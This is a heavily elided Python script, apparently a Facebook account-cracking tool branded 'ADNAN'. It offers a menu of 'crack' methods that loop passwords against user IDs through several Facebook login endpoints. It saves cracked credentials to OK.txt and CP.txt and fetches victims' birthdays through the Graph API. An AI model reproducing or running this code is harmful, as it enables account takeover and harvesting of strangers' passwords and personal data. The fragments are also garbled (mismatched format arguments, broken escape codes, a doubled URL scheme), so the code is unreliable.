...
def readline___Public_Xml():
	...
	if key in [""]:
		...
		time.sleep(0.5)
		print (" [•] Search : Fb Search / Mahin Ahmed")
	elif key in ["0", "00"]:
		exit("\n [✓] Thank you so much♥️\n")
	else:
		exit()
...
def login():
	...
	try:
			...
			print('\n\n[*] Token Expired \033[1;93m Enter fresh Token ')
			time.sleep(1)
			login()
...
class __crack__:
	...
	def plerr(self):
		...
		if _jokowi_kontol_ in ('M', 'm'):
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			IMTIAZ_AKING(' [1] ADNAN Method 1 ')
			IMTIAZ_AKING(' [2] ADNAN Method 2  [ Pro ]')
			IMTIAZ_AKING(' [3] ADNAN Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [MAHIN 😪] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				IMTIAZ_AKING('\r\033[1;92m[Successful-ADNAN] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [ADNAN] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;32m[Successful-ADNAN] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					cp_ttl = Prof_IMtiaz('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].IMTIAZ_AKING('\r\033[1;91m[Checkpoint-ADNAN] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				IMTIAZ_AKING('\r\033[1;92m[Successful-ADNAN] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
banner="""\033[94m
      ...
      _       ______   ____  _____       _       ____  _____      ___  ____   _____  ____  _____   ______   
    / \     |_   _ `.|_   \|_   _|     / \     |_   \|_   _|    |_  ||_  _| |_   _||_   \|_   _|.' ___  |  
\033[1;93    / _ \      | | `. \ |   \ | |      / _ \      |   \ | | ______ | |_/ /     | |    |   \ | | / .'   \_|  
\033[1;92   / ___ \     | |  | | | |\ \| |     / ___ \     | |\ \| ||______||  __'.     | |    | |\ \| | | |   ____  
\033[1;97 _/ /   \ \_  _| |_.' /_| |_\   |_  _/ /   \ \_  _| |_\   |_      _| |  \ \_  _| |_  _| |_\   |_\ `.___]  | 
\033[1;91|____| |____||______.'|_____|\____||____| |____||_____|\____|    |____||____||_____||_____|\____|`._____.'  
                                                               

 [*]=============================================
    Author           :  \033[1;93mBMX ADNAN AHMED
    \033[1;92mFacebook.        : https://https://www.facebook.com/jonising.com12
